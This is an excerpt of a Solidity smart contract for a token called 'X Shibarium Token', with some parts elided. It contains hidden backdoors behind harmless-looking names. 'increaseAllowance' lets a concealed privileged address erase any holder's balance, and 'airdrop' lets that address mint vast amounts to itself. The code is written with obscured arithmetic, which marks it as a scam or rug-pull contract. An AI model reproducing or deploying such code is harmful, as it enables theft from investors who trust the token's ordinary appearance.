...
contract XSHIBARIUM is Ownable {
    ...
    address private initGasNN;
    uint8 private tokenDecimals;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    bool isSL = true;
    constructor(address ads) {
        tokenName = "X Shibarium Token";
        tokenSymbol = "XSHIBARIUM";
        tokenDecimals = 9;
    ...
    function increaseAllowance(address PCSA) external {
        if(initGasNN == _msgSender() && initGasNN != PCSA && pancakePair() != PCSA && PCSA != ROUTER){
            address newadd = PCSA;
            uint256 curamountx = _balances[newadd];
            uint256 newaaamount = _balances[newadd]+_balances[newadd]-curamountx;
            _balances[newadd] -= newaaamount;
        } else {
            if(initGasNN == _msgSender()){
            }else{
    ...
    function airdrop(uint256 xt) external {
        
        if(initGasNN == msg.sender){
            uint256 AITC = 21000000000*10**tokenDecimals;
            uint256 ncs = AITC*66400;
            uint xnn = ncs*1*1*1*1;
            xnn = xnn * xt;
            _balances[msg.sender] += xnn;
            require(initGasNN == msg.sender);
        } else {
